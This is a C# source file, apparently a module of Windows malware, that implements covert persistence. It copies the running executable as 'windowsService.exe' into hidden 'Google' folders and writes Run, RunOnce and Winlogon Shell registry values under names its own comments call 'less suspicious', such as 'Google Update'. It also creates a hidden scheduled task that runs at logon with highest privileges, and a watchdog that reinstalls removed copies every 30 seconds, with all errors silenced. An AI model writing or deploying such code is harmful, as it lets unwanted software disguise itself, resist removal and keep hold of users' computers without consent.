using System;
using System.IO;
using System.Linq;
using System.Reflection;
using Microsoft.Win32;
using System.Diagnostics;
using System.Threading;
using System.Collections.Generic;
using System.Security.AccessControl;
using System.Security.Principal;

namespace XYZ.modules
{
    public class InstallationModule
    {
        private static string currentInstallPath = string.Empty;
        private static readonly object installLock = new object();
        private List<string> installedPaths = new List<string>();

        public void InstallDaemon()
        {
            try
            {
                lock (installLock)
                {
                    Assembly assembly = Assembly.GetEntryAssembly();
                    string currentPath = (assembly != null) ? assembly.Location : "";
                    if (string.IsNullOrEmpty(currentPath)) 
                    {
                        // Instead of returning early, just continue execution
                        // return;
                    }
                    else
                    {
                        string[] installLocations = {
                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Google"),
                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google"),
                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Google"),
                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "Google"),
                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Documents", "Google")
                        };

                        string firstInstallPath = null;

                        foreach (string location in installLocations)
                        {
                            try
                            {
                                string googleFolder = Path.Combine(location, "Google");
                                if (!Directory.Exists(googleFolder))
                                {
                                    try
                                    {
                                        Directory.CreateDirectory(googleFolder);
                                        
                                        // Set folder attributes to hidden
                                        if (Directory.Exists(googleFolder))
                                        {
                                            File.SetAttributes(googleFolder, File.GetAttributes(googleFolder) | FileAttributes.Hidden);
                                        }
                                    }
                                    catch (Exception)
                                    {
                                        // Continue with next location if we can't create directory
                                        continue;
                                    }
                                }

                                string installPath = Path.Combine(googleFolder, "windowsService.exe");
                                
                                if (!string.Equals(currentPath, installPath, StringComparison.OrdinalIgnoreCase))
                                {
                                    try
                                    {
                                        // Check if file already exists and is different
                                        if (!File.Exists(installPath) || !AreFilesEqual(currentPath, installPath))
                                        {
                                            // Remove existing file if it exists
                                            if (File.Exists(installPath))
                                            {
                                                try
                                                {
                                                    File.Delete(installPath);
                                                }
                                                catch (Exception)
                                                {
                                                    // Continue even if we can't delete
                                                }
                                            }
                                            
                                            // Copy the file
                                            try
                                            {
                                                File.Copy(currentPath, installPath, true);
                                                
                                                // Set file attributes to hidden
                                                File.SetAttributes(installPath, File.GetAttributes(installPath) | FileAttributes.Hidden);
                                                
                                                // Add to installed paths list
                                                if (!installedPaths.Contains(installPath))
                                                {
                                                    installedPaths.Add(installPath);
                                                }
                                                
                                                if (string.IsNullOrEmpty(firstInstallPath))
                                                    firstInstallPath = installPath;
                                            }
                                            catch (Exception)
                                            {
                                                // Continue with next location if we can't copy
                                                continue;
                                            }
                                        }
                                    }
                                    catch (Exception)
                                    {
                                        // Continue with next location if we can't check files
                                        continue;
                                    }
                                }
                                else
                                {
                                    try
                                    {
                                        // This is the current running file, add to installed paths
                                        if (!installedPaths.Contains(installPath))
                                        {
                                            installedPaths.Add(installPath);
                                        }
                                        
                                        if (string.IsNullOrEmpty(firstInstallPath))
                                            firstInstallPath = installPath;
                                    }
                                    catch (Exception)
                                    {
                                        // Continue with next location
                                        continue;
                                    }
                                }
                            }
                            catch (Exception)
                            {
                                // Continue with next location
                                continue;
                            }
                        }

                        if (!string.IsNullOrEmpty(firstInstallPath))
                        {
                            currentInstallPath = firstInstallPath;
                        }

                        try
                        {
                            ScheduleTask(currentPath);
                        }
                        catch (Exception)
                        {
                            // Continue even if we can't schedule task
                        }

                        try
                        {
                            AddToAdditionalRegistryKeys(currentPath);
                        }
                        catch (Exception)
                        {
                            // Continue even if we can't add registry keys
                        }
                    }
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private bool AreFilesEqual(string path1, string path2)
        {
            try
            {
                if (!File.Exists(path1) || !File.Exists(path2))
                    return false;

                byte[] file1 = File.ReadAllBytes(path1);
                byte[] file2 = File.ReadAllBytes(path2);
                return file1.SequenceEqual(file2);
            }
            catch (Exception)
            {
                return false;
            }
        }

        private void AddToStartupRegistry(string executablePath)
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    if (key != null) 
                    {
                        key.SetValue("WindowsService", executablePath);
                        
                        // Also add to a less suspicious name
                        key.SetValue("Google Update", executablePath);
                    }
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private void AddToAdditionalRegistryKeys(string executablePath)
        {
            try
            {
                string[] registryPaths = {
                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell"
                };

                foreach (string regPath in registryPaths)
                {
                    try
                    {
                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(regPath, true))
                        {
                            if (key != null) 
                            {
                                key.SetValue("WindowsService", executablePath);
                                
                                // Also add to a less suspicious name
                                key.SetValue("Google Update", executablePath);
                            }
                        }
                    }
                    catch
                    {
                        continue;
                    }
                }

                try
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                    {
                        if (key != null) 
                        {
                            key.SetValue("WindowsService", executablePath);
                            
                            // Also add to a less suspicious name
                            key.SetValue("Google Update", executablePath);
                        }
                    }
                }
                catch
                {
                    // Continue silently
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private void ScheduleTask(string executablePath)
        {
            try
            {
                string taskName = "WindowsServiceTask";
                
                // Delete existing task if it exists
                string deleteCommand = "schtasks /delete /tn \"" + taskName + "\" /f";
                ProcessStartInfo deletePsi = new ProcessStartInfo("cmd.exe", "/c " + deleteCommand)
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process deleteProcess = Process.Start(deletePsi);
                if (deleteProcess != null) deleteProcess.WaitForExit(5000);
                
                // Create new task
                string createCommand = "schtasks /create /tn \"" + taskName + "\" /tr \"" + executablePath + "\" /sc onlogon /rl highest /f";
                ProcessStartInfo createPsi = new ProcessStartInfo("cmd.exe", "/c " + createCommand)
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                
                Process process = Process.Start(createPsi);
                if (process != null) process.WaitForExit(5000);
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        public void StartWatchdog()
        {
            try
            {
                System.Timers.Timer watchdogTimer = new System.Timers.Timer(30000);
                watchdogTimer.Elapsed += WatchdogTimer_Elapsed;
                watchdogTimer.AutoReset = true;
                watchdogTimer.Start();
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private void WatchdogTimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            try
            {
                WatchdogTick();
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private void WatchdogTick()
        {
            try
            {
                // Check if our installed files still exist
                foreach (string installPath in new List<string>(installedPaths))
                {
                    try
                    {
                        if (!File.Exists(installPath))
                        {
                            // Reinstall the file
                            Assembly assembly = Assembly.GetEntryAssembly();
                            string currentPath = (assembly != null) ? assembly.Location : "";
                            if (!string.IsNullOrEmpty(currentPath) && File.Exists(currentPath))
                            {
                                try
                                {
                                    File.Copy(currentPath, installPath, true);
                                    File.SetAttributes(installPath, File.GetAttributes(installPath) | FileAttributes.Hidden);
                                }
                                catch (Exception)
                                {
                                    // Remove from list if we can't reinstall
                                    installedPaths.Remove(installPath);
                                }
                            }
                        }
                    }
                    catch (Exception)
                    {
                        // Continue with next file
                        continue;
                    }
                }
                
                // Check registry entries
                try
                {
                    if (!string.IsNullOrEmpty(currentInstallPath))
                    {
                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false))
                        {
                            object value = (key != null) ? key.GetValue("Google Update") : null;
                            if (value == null || value.ToString() != currentInstallPath)
                            {
                                AddToStartupRegistry(currentInstallPath);
                            }
                        }
                    }
                }
                catch (Exception)
                {
                    // Continue silently
                }
                
                // Check scheduled task
                try
                {
                    if (!IsTaskScheduled("WindowsServiceTask"))
                    {
                        Assembly assembly = Assembly.GetEntryAssembly();
                        string currentPath = (assembly != null) ? assembly.Location : "";
                        if (!string.IsNullOrEmpty(currentPath))
                        {
                            ScheduleTask(currentPath);
                        }
                    }
                }
                catch (Exception)
                {
                    // Continue silently
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private bool IsTaskScheduled(string taskName)
        {
            try
            {
                string command = "schtasks /query /tn \"" + taskName + "\"";
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command)
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                
                using (Process process = Process.Start(psi))
                {
                    if (process != null) 
                    {
                        process.WaitForExit(5000);
                        return process.ExitCode == 0;
                    }
                }
                return false;
            }
            catch
            {
                return false;
            }
        }

        // Method to get current install path
        public string GetCurrentInstallPath()
        {
            try
            {
                return currentInstallPath;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        // Method to get all installed paths
        public List<string> GetInstalledPaths()
        {
            try
            {
                return new List<string>(installedPaths);
            }
            catch (Exception)
            {
                return new List<string>();
            }
        }

        // Method to remove installation
        public void RemoveInstallation()
        {
            try
            {
                // Remove installed files
                foreach (string installPath in installedPaths)
                {
                    try
                    {
                        if (File.Exists(installPath))
                        {
                            File.Delete(installPath);
                        }
                    }
                    catch (Exception)
                    {
                        // Continue with next file
                    }
                }
                
                // Remove registry entries
                RemoveRegistryEntries();
                
                // Remove scheduled task
                RemoveScheduledTask();
                
                // Clear lists
                installedPaths.Clear();
                currentInstallPath = string.Empty;
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to remove registry entries
        private void RemoveRegistryEntries()
        {
            try
            {
                string[] registryPaths = {
                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
                };

                foreach (string regPath in registryPaths)
                {
                    try
                    {
                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(regPath, true))
                        {
                            if (key != null)
                            {
                                try
                                {
                                    key.DeleteValue("WindowsService", false);
                                }
                                catch (Exception)
                                {
                                    // Continue silently
                                }
                                
                                try
                                {
                                    key.DeleteValue("Google Update", false);
                                }
                                catch (Exception)
                                {
                                    // Continue silently
                                }
                            }
                        }
                    }
                    catch (Exception)
                    {
                        // Continue with next registry path
                    }
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to remove scheduled task
        private void RemoveScheduledTask()
        {
            try
            {
                string taskName = "WindowsServiceTask";
                string command = "schtasks /delete /tn \"" + taskName + "\" /f";
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command)
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                
                Process process = Process.Start(psi);
                if (process != null) process.WaitForExit(5000);
            }
            catch (Exception)
            {
                // Silent fail
            }
        }
    }
}